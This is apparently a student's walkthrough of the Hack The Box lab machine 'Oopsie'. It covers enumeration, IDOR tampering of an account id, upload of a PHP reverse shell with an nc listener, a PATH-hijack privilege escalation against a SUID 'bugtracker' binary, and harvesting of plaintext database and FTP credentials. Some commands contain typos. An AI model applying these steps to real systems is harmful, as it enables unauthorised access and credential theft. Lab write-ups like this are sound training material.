## Oopsie

1. Enumerate Host:
   
   - `nmap -sC -sV -Pn 10.10.10.28`
   
   - Open ports are 22 & 80
   
   - Port 22 is usually for SSH
   
   - Port 80 is for HTTP, means there's a webserver running on the website! Let's go check it out

2. Website says `login` to access services, so maybe perhaps there is some sort of login page?

3. Use burpsuite to crawl website for clues
   
   - We observe a `/cdn-cgi/login/script.js`, this may indicate that there is a login page with the following path
   
   - When we try accessing that route, we get the login page
   
   - Access credentials using the credentials we obtained from our previous box (there must be another way)

4. When using burpsuite, make sure that:
   
   - intercept mode is `on` so you can control the flow of requests
   
   - ensure proxy is pointing to `127.0.0.1:8080`
   
   - To do webcrawling/generate sitemap, can also use tools like
   
      1. Gobuster
     
      2. Dirbuster
     
      3. Dirsearch
     
      4. Manually inspect element on the site and look at script tags, style tags, hrefs etc. (but very labour intensive)

5. Once we are logged in, we observe that there are certain functions that we can/cannot perform (such as uploads) and there are different levels of privileges (e.g. admin, super admin)

   1. Click on accounts

   2. Observing what Burp has intercepted

   3. Use `intruder` mode on burp suite and try to brute force the `id` parameter via the following bash script

      `for i in 'seq 1 1000;' do echo $1; done`

   4. PASTE the output into the Payloads box
   
   5. Start attack!
   
   6. Investigate the lengths which are different
   
   7. Use the userid of the super user
   
      - Parameter tampering can also be tested here, after clicking on the `accounts` tab, you can tinker around with the `id` parameter in the url
      
      - if you directly set the `id` to 30, you can immediately pull the values of the super user

6. Access & upload reverse shell
   
   - Always change the `user` param to the super user's (86575) when forwarding the requests!
   
      - If you do not do this it will not work!
   
   - for parrot OS, there is a default reverse shell in `/usr/share/webshells/php/php-reverse-shell.php`
   
   - for kali linux, you can try http://pentestmonkey.net/tools/web-shells/php-reverse-shell
   
      - Change $ip to tun0 ip
     
      - Change $port to whatever port you want

7. Finding where the reverse shell has been uploaded to!

   ```
   locate dirbuster
   gobuster dir -u http://10.10.10.28 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
   ```

8. Connect to the shell!
   
   - `sudo ufw allow from 10.10.10.28 to any port 10666`
   
   - run `nc -v -n -l -p 10666`
   
   - Use browser to make GET request or use curl command to make GET request to trigger reverse shell
     
      - if you encounter `resource not found`, it means the shell you originally uploaded got somehow removed lol. Ensure that the uploading of the shell, listening on nc, and connecting back to the shell is seamless!
     
      - Also, don't close the browser, if you close it, you will lose connection to your shell
   
   - Make sure to add firewall rules on ufw...
   
      - [ufw - firewall management tool on linux](https://en.wikipedia.org/wiki/Uncomplicated_Firewall)
     
      - [ufw rules](https://www.reddit.com/r/tryhackme/comments/m55bp3/cant_reverse_shell_using_ncap/#ufw)
     
      - [telnet to check for connections](https://netbeez.net/blog/telnet-to-test-connectivity-to-tcp/)
     
      - [kali linux firewall](https://www.hacknos.com/what-is-the-firewall/)
      
9. Navigate to `/home/robert` directory and get user flag

10. Upgrade shell `SHELL=/bin/bash script -1 /dev/null`

11. Lateral Movement:

    ```bash
    ls /var/www/html/cdn-cgi/login
    cat /var/www/html/cdn-cgi/login/db.php
    ```

    Output: 

    ```php
    <?php
    $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
    ?>
    ```

12. Privilege Escalation using Robert credentials

    - su using robert and the password
    
    - also can try ssh robert@10.10.10.28

13. Robert does not seem to have root privileges 

    -  Attempts to browse to the root folder or to use sudo confirm robert doesn’t have high levels of privilege.

14. run `id` and see that robert belongs to group `bugtracker`

15. run `locate bugtracker`

    ```
    /usr/bin/bugtracker
    ```

16. run `/usr/bin/bugtracker`

    - turns out to be some tool to print out details of bugs by id
    
17. Try to read contents of program
    
    - if `cat` command not working, try `strings`
    
    - https://www.lifewire.com/strings-linux-command-4093452
    
    - `strings /usr/bin/bugtracker`

18. We realise that bugtracker uses `cat`, hence lets try to misconfigure `cat` to execute a malicious binary

    ```
    export PATH=/tmp:$PATH
    cd /tmp
    echo '/bin/bash' > cat
    chmod +x cat
    ```

    [What is $PATH? Click here!](https://medium.com/@jalendport/what-exactly-is-your-shell-path-2f076f02deb4) Basically, when you run bugtracker after running the above commands, it will execute /bin/bash as well, which runs a bash shell with root privileges

19. Find root flag

20. Post exploitation:

    ```bash
    cd /root/.config/filezilla
    more filezilla.xml
    ```

    Output (FTP credentials in plaintext):

    ```
    <?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
    <FileZilla3>
        <RecentServers>
            <Server>
                <Host>10.10.10.44</Host>
                <Port>21</Port>
                <Protocol>0</Protocol>
                <Type>0</Type>
                <User>ftpuser</User>
                <Pass>mc@F1l3ZilL4</Pass>
                <Logontype>1</Logontype>
                <TimezoneOffset>0</TimezoneOffset>
                <PasvMode>MODE_DEFAULT</PasvMode>
                <MaximumMultipleConnections>0</MaximumMultipleConnections>
                <EncodingType>Auto</EncodingType>
                <BypassProxy>0</BypassProxy>
            </Server>
        </RecentServers>
    </FileZilla3>
    ```

https://www.shells.com/l/en-US/tutorial/How-to-Fix-Shell-Script-Permission-Denied-Error-in-Linux

https://opensource.com/article/17/6/set-path-linux

https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d

